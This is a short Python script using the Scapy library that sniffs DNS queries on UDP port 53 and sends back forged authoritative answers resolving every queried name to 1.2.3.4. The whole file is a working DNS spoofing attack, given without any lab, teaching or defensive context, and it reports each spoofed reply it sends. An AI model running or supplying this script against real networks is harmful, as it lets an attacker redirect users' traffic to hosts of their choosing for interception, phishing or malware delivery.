from scapy.all import *

def send_fake_response(request):
    # Extract details from the request
    ip_src = request[IP].dst
    ip_dst = request[IP].src
    udp_sport = request[UDP].dport
    udp_dport = request[UDP].sport
    dns_id = request[DNS].id
    query_name = request[DNSQR].qname

    # Create a DNS response
    dns_response = (
        IP(src=ip_src, dst=ip_dst) /
        UDP(sport=udp_sport, dport=udp_dport) /
        DNS(id=dns_id, qr=1, aa=1, qd=request[DNS].qd,
            an=DNSRR(rrname=query_name, ttl=10, rdata='1.2.3.4'))
    )

    # Send the DNS response
    send(dns_response)
    print(f"Sent spoofed DNS response for {query_name}")

def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        send_fake_response(packet)

sniff(filter="udp port 53", prn=dns_sniffer)
